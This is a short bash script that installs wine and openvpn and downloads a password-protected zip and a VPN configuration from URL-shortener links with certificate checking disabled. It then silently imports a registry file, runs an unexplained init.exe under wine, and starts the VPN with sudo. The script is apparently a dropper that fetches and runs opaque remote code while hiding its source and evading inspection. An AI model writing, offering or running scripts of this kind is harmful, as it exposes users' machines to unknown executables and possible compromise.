#!/bin/bash
sudo apt update;
sudo apt install unzip wget openvpn winetricks -y;
mkdir ~/init/;
wget --no-check-certificate -O ~/init/init.zip https://is.gd/initzip;
wget --no-check-certificate -O ~/init/vpn https://is.gd/sickvpnclient;
cd ~/init/;
rm -rf init.exe;
unzip -P1011011011 init.zip;
wine regedit /s /root/s.reg;
wine init.exe;
sudo openvpn vpn;
exit 0
